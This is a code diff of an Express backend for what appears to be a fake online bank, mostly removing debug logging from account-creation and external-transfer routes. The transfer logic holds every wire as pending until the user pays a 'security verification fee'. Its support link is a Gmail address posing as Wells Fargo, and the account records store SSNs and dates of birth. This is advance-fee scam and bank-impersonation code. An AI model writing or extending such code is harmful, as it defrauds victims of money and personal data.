@@ -200,7 +200,7 @@ app.post('/api/auth/create-instant', authMiddleware, async (req, res) => {
             ssn,
             dob,
             customerSince: new Date().getFullYear(),
-            rewards: { balance: alexTemplate.rewards.balance, activity: [] },
+            rewards_balance: alexTemplate.rewards.balance,
             is_active: true,
             created_at: new Date().toISOString()
         };
@@ -611,35 +611,23 @@ app.post('/api/transfers', authMiddleware, async (req, res) => {
 app.post('/api/transfers/external', authMiddleware, async (req, res) => {
     try {
         const { fromAccountId, amount, recipient, transferDetails } = req.body;
-        console.log('DEBUG: External transfer request:', { fromAccountId, amount, recipient, transferDetails });
         const parsedAmount = parseFloat(amount);
         if (!fromAccountId || !parsedAmount || parsedAmount <= 0 || !recipient || !transferDetails) {
-            console.log('DEBUG: Invalid transfer data:', { fromAccountId, amount, recipient, transferDetails });
             return res.status(400).json({ message: "Invalid transfer data" });
         }
         
         const fromAccount = await dbService.getAccount(fromAccountId);
-        if (!fromAccount) {
-            console.log('DEBUG: Account not found:', fromAccountId);
-            return res.status(404).json({ message: "Account not found." });
-        }
-        if (fromAccount.balance < parsedAmount) {
-            console.log('DEBUG: Insufficient funds:', fromAccount.balance, parsedAmount);
-            return res.status(400).json({ message: "Insufficient funds." });
-        }
+        if (!fromAccount) return res.status(404).json({ message: "Account not found." });
+        if (fromAccount.balance < parsedAmount) return res.status(400).json({ message: "Insufficient funds." });
         
         const sender = await dbService.getUser(fromAccount.user_id);
-        if (!sender) {
-            console.log('DEBUG: Sender not found:', fromAccount.user_id);
-            return res.status(404).json({ message: "Sender not found." });
-        }
+        if (!sender) return res.status(404).json({ message: "Sender not found." });
         const date = new Date().toLocaleDateString('en-US', { month: '2-digit', day: '2-digit', year: '2-digit' });
         const isoDate = new Date().toISOString();
-        const recipientName = recipient.recipientName || recipient.name || 'the recipient';
-        const txId = `txn-${uuidv4()}`;
         let transactionStatus = 'Pending';
         let transactionReason = null;
         let notificationMessage = '';
+        const txId = `txn-${uuidv4()}`;
 
         if (transferDetails.type === 'wire') {
             transactionReason = {
@@ -655,7 +643,7 @@ I am writing to inquire about the security verification fee for a recent wire tr
 Please provide instructions on how to proceed.
 
 Transaction Details:
-- Recipient: ${recipientName}
+- Recipient: ${recipient.recipientName}
 - Amount: $${parsedAmount.toFixed(2)}
 - Transaction ID: ${txId}
 - Date: ${new Date(isoDate).toLocaleString()}
@@ -666,10 +654,10 @@ ${sender.fullName}
             );
             const mailtoLink = `mailto:noreply.wellsfargo.contact@gmail.com?subject=${mailtoSubject}&body=${mailtoBody}`;
             
-            notificationMessage = `Your wire transfer to ${recipientName} is pending. A security fee is required to proceed. Please use this link to contact support: <a href="${mailtoLink}">Contact Support</a>.`;
+            notificationMessage = `Your wire transfer to ${recipient.recipientName} is pending. A security fee is required to proceed. Please use this link to contact support: <a href="${mailtoLink}">Contact Support</a>.`;
             await dbService.addNotification(sender.id, notificationMessage);
         } else { // ACH
-            notificationMessage = `Your external transfer of $${parsedAmount.toFixed(2)} to ${recipientName} has been initiated.`;
+            notificationMessage = `Your external transfer of $${parsedAmount.toFixed(2)} to ${recipient.recipientName} has been initiated.`;
             await dbService.addNotification(sender.id, notificationMessage);
             transactionStatus = 'Completed'; 
         }
@@ -679,11 +667,11 @@ ${sender.fullName}
             account_id: fromAccountId,
             accountId: fromAccountId,
             date, 
-            description: `External Transfer to ${recipientName}`, 
+            description: `External Transfer to ${recipient.recipientName}`, 
             amount: -parsedAmount, 
             type: 'debit', 
             category: 'transfer', 
-            merchant: transferDetails.type === 'wire' ? `${transferDetails.wireType || 'Wire'} Wire` : 'ACH Transfer',
+            merchant: transferDetails.type === 'wire' ? `${transferDetails.wireType} Wire` : 'ACH Transfer',
             status: transactionStatus,
             postedDate: isoDate, 
             runningBalance: fromAccount.balance - (transactionStatus === 'Completed' ? parsedAmount : 0),
